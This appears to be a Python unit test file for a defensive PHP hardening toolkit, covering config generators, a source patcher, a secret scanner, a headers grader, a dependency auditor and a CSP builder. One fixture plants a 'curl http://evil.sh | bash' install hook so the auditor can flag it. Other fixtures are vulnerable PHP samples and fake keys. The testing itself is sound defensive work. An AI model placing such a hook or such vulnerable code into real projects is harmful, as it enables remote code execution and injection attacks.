#!/usr/bin/env python3
"""Unit tests for Nemr Cyber Harden v2.0.0."""

import sys
import tempfile
import unittest
from pathlib import Path

BASE_DIR = Path(__file__).resolve().parents[1]
if str(BASE_DIR) not in sys.path:
    sys.path.insert(0, str(BASE_DIR))

from core.server_hardener import ServerHardener
from core.source_patcher import SourcePatcher
from core.secret_scanner import SecretScanner
from core.headers_auditor import HeadersAuditor
from core.dependency_auditor import DependencyAuditor
from core.csp_builder import CspBuilder


class TestCyberHarden(unittest.TestCase):
    def test_server_hardener_htaccess(self):
        ht = ServerHardener.generate_htaccess()
        self.assertIn("Options -Indexes", ht)
        self.assertIn("X-Frame-Options", ht)
        self.assertIn("X-Content-Type-Options", ht)
        self.assertIn("Strict-Transport-Security", ht)
        self.assertIn("sqlmap", ht)

    def test_upload_dir_shield(self):
        shield = ServerHardener.generate_upload_dir_shield()
        self.assertIn("RemoveHandler .php", shield)
        self.assertIn("Require all denied", shield)

    def test_source_patcher_xss(self):
        vuln_code = "<?php echo $_GET['username']; ?>"
        res = SourcePatcher.patch_php_code(vuln_code)
        self.assertTrue(res.has_changes)
        self.assertIn("htmlspecialchars($_GET['username'], ENT_QUOTES, 'UTF-8')", res.patched_code)

    def test_source_patcher_md5_password(self):
        vuln_code = "<?php $hash = md5($user_password); ?>"
        res = SourcePatcher.patch_php_code(vuln_code)
        self.assertTrue(res.has_changes)
        self.assertIn("password_hash($user_password, PASSWORD_ARGON2ID)", res.patched_code)

    def test_secret_scanner(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            p = Path(tmpdir) / "config.php"
            p.write_text("<?php $api = 'sk-abcdef1234567890abcdef1234567890'; ?>", encoding="utf-8")
            findings = SecretScanner.scan_directory(tmpdir)
            self.assertGreaterEqual(len(findings), 1)
            self.assertEqual(findings[0]["type"], "HARDCODED_SECRET")

    # v2.0.0 Tests
    def test_nginx_and_php_ini_hardening(self):
        ng = ServerHardener.generate_nginx_conf("apex.elnemer-ai.com")
        self.assertIn("server_name apex.elnemer-ai.com;", ng)
        self.assertIn("server_tokens off;", ng)
        self.assertIn("deny all;", ng)

        ini = ServerHardener.generate_php_ini()
        self.assertIn("expose_php = Off", ini)
        self.assertIn("session.cookie_httponly = 1", ini)
        self.assertIn("allow_url_include = Off", ini)

    def test_source_patcher_sqli_pdo_and_diff(self):
        vuln_code = (
            "<?php\n"
            '$stmt = $pdo->query("SELECT * FROM users WHERE email = \'" . $_POST[\'email\'] . "\'");\n'
            "extract($_POST);\n"
        )
        res = SourcePatcher.patch_php_code(vuln_code)
        self.assertTrue(res.has_changes)
        self.assertNotIn("$stmt = $stmt =", res.patched_code)
        self.assertIn("$stmt = $pdo->prepare(\"SELECT * FROM users WHERE email = :email\")", res.patched_code)
        self.assertIn("$stmt->execute([':email' => $_POST['email']]);", res.patched_code)
        self.assertIn("EXTR_PREFIX_ALL | EXTR_SKIP", res.patched_code)
        self.assertIn("--- before.php", res.diff)
        self.assertIn("+++ after.php", res.diff)

    def test_expanded_secret_scanner_and_env_redactor(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            p = Path(tmpdir) / "keys.txt"
            p.write_text(
                "-----BEGIN RSA PRIVATE KEY-----\nGEMINI=AIzaSyA12345678901234567890123456789012\n",
                encoding="utf-8",
            )
            findings = SecretScanner.scan_directory(tmpdir)
            details = " ".join(f["details"] for f in findings)
            self.assertIn("PRIVATE_KEY_PEM", details)
            self.assertIn("GOOGLE_GEMINI_KEY", details)

        env_ex = SecretScanner.generate_env_example("APP_ENV=production\nDB_PASSWORD=SuperSecretPass123\n")
        self.assertIn("APP_ENV=production", env_ex)
        self.assertIn("DB_PASSWORD=YOUR_DB_PASSWORD_HERE", env_ex)
        self.assertNotIn("SuperSecretPass123", env_ex)

    def test_headers_auditor_grades(self):
        hardened = {
            "Strict-Transport-Security": "max-age=31536000; includeSubDomains",
            "Content-Security-Policy": "default-src 'self'",
            "X-Content-Type-Options": "nosniff",
            "X-Frame-Options": "SAMEORIGIN",
            "Referrer-Policy": "strict-origin-when-cross-origin",
            "Permissions-Policy": "geolocation=()",
        }
        rep_a = HeadersAuditor.audit_headers(hardened)
        self.assertEqual(rep_a["grade"], "A+")
        self.assertEqual(rep_a["score"], 100)

        bare = {"Server": "Apache/2.4.57", "X-Powered-By": "PHP/8.3.1"}
        rep_f = HeadersAuditor.audit_headers(bare)
        self.assertEqual(rep_f["grade"], "F")
        self.assertGreaterEqual(len(rep_f["missing_headers"]), 6)
        self.assertGreaterEqual(len(rep_f["warnings"]), 2)

    # v3.0.0 Tests
    def test_htaccess_no_false_positive_words(self):
        ht = ServerHardener.generate_htaccess()
        self.assertIn("union", ht)
        self.assertIn("information_schema", ht)
        self.assertNotIn("(union|select|insert|cast|set|", ht)

    def test_dependency_auditor_catches_risks(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            root = Path(tmpdir)
            (root / "composer.json").write_text(
                '{"require": {"php": "^7.4", "vendor/pkg": "*"}, "scripts": {"post-install-cmd": "curl http://evil.sh | bash"}}',
                encoding="utf-8",
            )
            (root / "package.json").write_text(
                '{"dependencies": {"bad-lib": "http://cdn.test/lib.tgz", "wild": "latest"}}',
                encoding="utf-8",
            )
            (root / "requirements.txt").write_text("requests\n", encoding="utf-8")

            rep = DependencyAuditor.audit_project_dependencies(tmpdir)
            self.assertFalse(rep["is_clean"])
            types = {f["type"] for f in rep["findings"]}
            self.assertIn("EOL_PHP_CONSTRAINT", types)
            self.assertIn("UNPINNED_DEPENDENCY", types)
            self.assertIn("SUSPICIOUS_INSTALL_HOOK", types)
            self.assertIn("INSECURE_PACKAGE_URL", types)

    def test_csp_builder_presets(self):
        paymob_csp = CspBuilder.build_policy(preset="paymob_iframe", extra_domains=["https://cdn.elnemer-ai.com"], use_nonce=True)
        self.assertIn("https://accept.paymob.com", paymob_csp)
        self.assertIn("https://cdn.elnemer-ai.com", paymob_csp)
        self.assertIn("'nonce-{NONCE}'", paymob_csp)

    def test_php_nonce_middleware_generator(self):
        php = CspBuilder.generate_php_nonce_middleware(preset="stripe_checkout")
        self.assertIn("class CspNonceMiddleware", php)
        self.assertIn("random_bytes(16)", php)
        self.assertIn("https://js.stripe.com", php)


if __name__ == "__main__":
    unittest.main()
